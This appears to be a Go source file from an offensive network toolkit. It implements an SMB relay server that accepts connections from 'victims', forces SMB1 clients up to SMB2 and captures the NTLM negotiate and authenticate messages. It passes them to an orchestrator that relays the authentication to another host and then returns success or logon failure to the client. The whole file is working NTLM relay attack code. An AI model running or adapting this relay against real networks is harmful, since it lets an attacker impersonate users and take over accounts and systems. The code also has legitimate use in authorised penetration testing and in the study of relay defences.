// SPDX-License-Identifier: Apache-2.0

package relay

import (
	"crypto/rand"
	"encoding/asn1"
	"fmt"
	"log"
	"net"

	"gopacket/internal/build"
)

// SMBRelayServer listens for incoming SMB2 connections from victims
// and captures NTLM authentication for relay.
type SMBRelayServer struct {
	listenAddr string
	listener   net.Listener
	authCh     chan<- AuthResult
}

// NewSMBRelayServer creates a new SMB relay server.
func NewSMBRelayServer(listenAddr string) *SMBRelayServer {
	return &SMBRelayServer{listenAddr: listenAddr}
}

// Start begins listening for victim connections, implements ProtocolServer.
func (s *SMBRelayServer) Start(resultChan chan<- AuthResult) error {
	ln, err := net.Listen("tcp", s.listenAddr)
	if err != nil {
		return fmt.Errorf("failed to listen on %s: %v", s.listenAddr, err)
	}
	s.listener = ln
	s.authCh = resultChan

	log.Printf("[*] SMB relay server listening on %s", s.listenAddr)

	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				if build.Debug {
					log.Printf("[D] Relay server: accept error: %v", err)
				}
				return
			}
			go s.handleConnection(conn)
		}
	}()

	return nil
}

// Stop closes the listener, implements ProtocolServer.
func (s *SMBRelayServer) Stop() error {
	if s.listener != nil {
		return s.listener.Close()
	}
	return nil
}

func (s *SMBRelayServer) handleConnection(conn net.Conn) {
	defer conn.Close()

	remoteAddr := conn.RemoteAddr().String()
	log.Printf("[*] Incoming connection from %s", remoteAddr)

	// Generate a random server GUID
	var serverGUID [16]byte
	rand.Read(serverGUID[:])

	// Step 1: Receive SMB negotiate (could be SMB1 or SMB2)
	pkt, err := recvPacket(conn)
	if err != nil {
		if build.Debug {
			log.Printf("[D] Relay server: failed to receive negotiate from %s: %v", remoteAddr, err)
		}
		return
	}

	if build.Debug {
		dumpLen := len(pkt)
		if dumpLen > 64 {
			dumpLen = 64
		}
		log.Printf("[D] Relay server: first packet (%d bytes), header: %x", len(pkt), pkt[:dumpLen])
	}

	// Check if this is an SMB1 negotiate (\xFF SMB)
	if len(pkt) >= 4 && pkt[0] == 0xFF && pkt[1] == 'S' && pkt[2] == 'M' && pkt[3] == 'B' {
		if build.Debug {
			log.Printf("[D] Relay server: received SMB1 negotiate from %s, sending SMB2 negotiate response", remoteAddr)
		}
		// Respond with an SMB2 negotiate response to force protocol upgrade
		spnegoHint, err := encodeNegTokenInit2([]asn1.ObjectIdentifier{nlmpOid})
		if err != nil {
			log.Printf("[-] Failed to encode SPNEGO hint: %v", err)
			return
		}
		negResp := buildNegotiateResponse(0, serverGUID, spnegoHint)
		if err := sendPacket(conn, negResp); err != nil {
			if build.Debug {
				log.Printf("[D] Relay server: failed to send negotiate response to SMB1 client: %v", err)
			}
			return
		}

		// Now receive the real SMB2 negotiate
		pkt, err = recvPacket(conn)
		if err != nil {
			if build.Debug {
				log.Printf("[D] Relay server: failed to receive SMB2 negotiate after upgrade: %v", err)
			}
			return
		}

		if build.Debug {
			dumpLen := len(pkt)
			if dumpLen > 64 {
				dumpLen = 64
			}
			log.Printf("[D] Relay server: second packet (%d bytes), header: %x", len(pkt), pkt[:dumpLen])
		}
	}

	hdr, err := parseSMB2Header(pkt)
	if err != nil {
		if build.Debug {
			log.Printf("[D] Relay server: invalid header from %s: %v", remoteAddr, err)
		}
		return
	}

	if build.Debug {
		log.Printf("[D] Relay server: SMB2 command=0x%04x status=0x%08x from %s", hdr.Command, hdr.Status, remoteAddr)
	}

	// After SMB1→SMB2 upgrade, the client may skip NEGOTIATE and go straight
	// to SESSION_SETUP. Handle both cases.
	if hdr.Command == SMB2_NEGOTIATE {
		// Normal flow: send NEGOTIATE response, then receive SESSION_SETUP
		spnegoHint, err := encodeNegTokenInit2([]asn1.ObjectIdentifier{nlmpOid})
		if err != nil {
			log.Printf("[-] Failed to encode SPNEGO hint: %v", err)
			return
		}

		negResp := buildNegotiateResponse(hdr.MessageID, serverGUID, spnegoHint)
		if build.Debug {
			dumpLen := len(negResp)
			if dumpLen > 160 {
				dumpLen = 160
			}
			log.Printf("[D] Relay server: sending negotiate response (%d bytes): %x", len(negResp), negResp[:dumpLen])
		}
		if err := sendPacket(conn, negResp); err != nil {
			if build.Debug {
				log.Printf("[D] Relay server: failed to send negotiate response: %v", err)
			}
			return
		}

		// Receive SESSION_SETUP #1
		pkt, err = recvPacket(conn)
	} else if hdr.Command == SMB2_SESSION_SETUP {
		// Client skipped NEGOTIATE after SMB1 upgrade — use this packet directly
		if build.Debug {
			log.Printf("[D] Relay server: client skipped NEGOTIATE after SMB1 upgrade, processing SESSION_SETUP directly")
		}
	} else {
		if build.Debug {
			log.Printf("[D] Relay server: expected NEGOTIATE or SESSION_SETUP, got command 0x%04x", hdr.Command)
		}
		return
	}

	// Step 2: Receive SESSION_SETUP #1 (NTLM Type 1)
	// pkt is already set — either from recvPacket (NEGOTIATE path) or reused (SESSION_SETUP path)
	if err != nil {
		if build.Debug {
			log.Printf("[D] Relay server: failed to receive session setup 1: %v", err)
		}
		return
	}

	hdr, err = parseSMB2Header(pkt)
	if err != nil || hdr.Command != SMB2_SESSION_SETUP {
		if build.Debug {
			log.Printf("[D] Relay server: expected SESSION_SETUP, got error or wrong command")
		}
		return
	}

	secBuf, err := parseSessionSetupRequest(pkt)
	if err != nil {
		if build.Debug {
			log.Printf("[D] Relay server: failed to parse session setup 1: %v", err)
		}
		return
	}

	// Extract NTLM Type 1 from SPNEGO
	if build.Debug {
		dumpLen := len(secBuf)
		if dumpLen > 80 {
			dumpLen = 80
		}
		log.Printf("[D] Relay server: SPNEGO security buffer (%d bytes): %x", len(secBuf), secBuf[:dumpLen])
	}
	type1, err := decodeNegTokenInit(secBuf)
	if err != nil {
		if build.Debug {
			log.Printf("[D] Relay server: failed to decode SPNEGO type1: %v", err)
		}
		return
	}

	if build.Debug {
		log.Printf("[D] Relay server: received NTLM Type 1 (%d bytes) from %s", len(type1), remoteAddr)
	}

	// Create auth result and push to orchestrator
	auth := AuthResult{
		NTLMType1:  type1,
		SourceAddr: remoteAddr,
		ServerConn: conn,
		Type2Ch:    make(chan []byte, 1),
		Type3Ch:    make(chan []byte, 1),
		ResultCh:   make(chan bool, 1),
	}

	s.authCh <- auth

	// Step 3: Wait for Type 2 challenge from orchestrator
	type2, ok := <-auth.Type2Ch
	if !ok || type2 == nil {
		log.Printf("[-] Relay failed for %s: no challenge received", remoteAddr)
		return
	}

	// Wrap Type 2 in SPNEGO NegTokenResp and send back to victim
	spnegoResp, err := encodeNegTokenResp(1, nlmpOid, type2) // state=1 (accept-incomplete)
	if err != nil {
		log.Printf("[-] Failed to encode SPNEGO challenge: %v", err)
		return
	}

	sessionID := uint64(0x4000000000) | uint64(serverGUID[0])<<8 | uint64(serverGUID[1])
	setupResp := buildSessionSetupResponse(hdr.MessageID, sessionID, STATUS_MORE_PROCESSING_REQUIRED, spnegoResp)
	if err := sendPacket(conn, setupResp); err != nil {
		if build.Debug {
			log.Printf("[D] Relay server: failed to send challenge to victim: %v", err)
		}
		return
	}

	// Step 4: Receive SESSION_SETUP #2 (NTLM Type 3)
	pkt, err = recvPacket(conn)
	if err != nil {
		if build.Debug {
			log.Printf("[D] Relay server: failed to receive session setup 2: %v", err)
		}
		return
	}

	hdr, err = parseSMB2Header(pkt)
	if err != nil || hdr.Command != SMB2_SESSION_SETUP {
		if build.Debug {
			log.Printf("[D] Relay server: expected SESSION_SETUP #2")
		}
		return
	}

	secBuf, err = parseSessionSetupRequest(pkt)
	if err != nil {
		if build.Debug {
			log.Printf("[D] Relay server: failed to parse session setup 2: %v", err)
		}
		return
	}

	// Extract NTLM Type 3 from SPNEGO
	type3, err := decodeNegTokenResp(secBuf)
	if err != nil {
		if build.Debug {
			log.Printf("[D] Relay server: failed to decode SPNEGO type3: %v", err)
		}
		return
	}

	// Extract user/domain from Type 3
	domain, user := extractNTLMType3Info(type3)
	auth.Domain = domain
	auth.Username = user

	if build.Debug {
		log.Printf("[D] Relay server: received NTLM Type 3 from %s\\%s", domain, user)
	}

	// Send Type 3 to orchestrator
	auth.Type3Ch <- type3

	// Step 5: Wait for result from orchestrator
	success := <-auth.ResultCh

	// Send final response to victim
	var finalStatus uint32
	if success {
		finalStatus = STATUS_SUCCESS
	} else {
		finalStatus = STATUS_LOGON_FAILURE
	}

	finalResp := buildSessionSetupResponse(hdr.MessageID, sessionID, finalStatus, nil)
	sendPacket(conn, finalResp)
}
